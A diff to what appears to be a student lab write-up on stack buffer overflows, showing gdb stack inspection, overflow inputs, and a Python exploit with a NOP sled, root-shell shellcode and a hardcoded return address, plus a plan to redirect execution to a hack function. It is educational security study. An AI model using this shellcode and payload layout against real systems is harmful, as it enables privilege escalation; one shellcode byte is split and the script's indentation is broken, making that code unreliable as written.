@@ -48,7 +48,9 @@ ln -s /bin/zsh /bin/sh
 
 ## Experiment 1
 
-![valid-input-1](https://github.com/wlgzaor/Buffer-Overflow/valid-input-1.png)
+#### Valid Input
+
+![valid-input-1](https://github.com/wlgzaor/Buffer-Overflow/blob/master/valid-input-1.png)
 
 We firstly executed these commands to check stack boundaries:
 
@@ -64,11 +66,17 @@ Bof function starts at 0bfffef90 and ends 0bfffef18.  The first word after $ebp 
 
 We also defined breakpoints at *main+48 (at return instruction of main) and *bof+27 (right after strcpy function). Input were sequence of 's' characters (smaller than 100). 
 
-![valid-input-2](https://github.com/wlgzaor/Buffer-Overflow/valid-input-2.png)
+![valid-input-2](https://github.com/wlgzaor/Buffer-Overflow/blob/master/valid-input-2.png)
 
 Here we can see that 's' (73 in ASCII) characters fill the appropriate field of stack and return address  wasn't overwritten by 's' characters.
 
-![valid-input-3](https://github.com/wlgzaor/Buffer-Overflow/valid-input-3.png)
+```python
+#!/usr/bin/python
+
+print  's' * 64
+```
+
+![valid-input-3](https://github.com/wlgzaor/Buffer-Overflow/blob/master/valid-input-3.png)
 
 We checked current eip by typing info frame command and there is no changes. Later we will see that how the instruction pointer changes when user enters invalid input.
 
@@ -111,16 +119,54 @@ The previous frame's stack pointer point to (the caller frame), at the moment of
 
 * eip at 0bfffef1c as mentioned before, but here is the address of the stack (which contains the value "080484be")
 
+#### Invalid Input
 
-![invalid-input-1](https://github.com/wlgzaor/Buffer-Overflow/invalid-input-1.png)
+![invalid-input-1](https://github.com/wlgzaor/Buffer-Overflow/blob/master/invalid-input-1.png)
 
 Now we see that return address (first word after ebp) overwritten to 0737373 (ebp was 0*bfffef18).
 
-![invalid-input-1](https://github.com/wlgzaor/Buffer-Overflow/invalid-input-2.png)
+```python
+#!/usr/bin/python
+
+print  's' * 116
+```
+
+![invalid-input-1](https://github.com/wlgzaor/Buffer-Overflow/blob/master/invalid-input-2.png)
 
 We can check eip register to see changes using info frame. Saved eip updated to 0737373 and there have no instruction like 0737373. So we got segmentation  fault.
 
+#### Open Root Shell
+
+Shellcode must not contain any null bytes (00). They will prevent the buffer from overflowing. Exploit that works in gdb may fail in  a real Linux shell because environment variables may cause the location of the stack to change slightly. Solution for this is a NOP Sled (a long series of “90” bytes) which do nothing. We used 64 byte NOP Sled. 
+
+NOP (64 byte) + shellcode (32 byte) + padding (16 byte) + eip (4 byte)
+
+Return address should hit the NOP's area. So eip will be point one of the starting address of NOP's area and instead of returning back to system, it return to the stack area, start executing the NOPs. Then proceeded to our shell.
+
+```python
+#!/usr/bin/python
+
+    nop = '\x90' * 64
+    shellcode =     ('\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2 f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80')
+
+   padding = 's' * 16
+   eip = '\xe0\xee\xff\xbf'  
+   print nop + shellcode + padding + eip
+```
+
+![shellcode-1](https://github.com/wlgzaor/Buffer-Overflow/blob/master/shellcode-1.png)
+
+Now we see that return address is 0bfffeee0. It'll return back to NOP's area instead of returning main.
+
+![shellcode-2](https://github.com/wlgzaor/Buffer-Overflow/blob/master/shellcode-2.png)
+
+Program opens shell but terminates it immediately. Note that, our program gets input using `gets` built-in function. To run shell please get input from user as a argument.
 
 ## Experiment 2
 
-Will be added after deadline.
+We will analyze stackbof in this experiment.
+
+In main function, a copy function is called and an input, which is given when
+the program runs, is passed to the copy function as an argument to copy into a
+character array, buf has the length of 10-bytes. Then the input is printed to the
+console. If the input is longer than 10 bytes, BOF will occur. We should jump to a hack function instead of the code after the copy function.
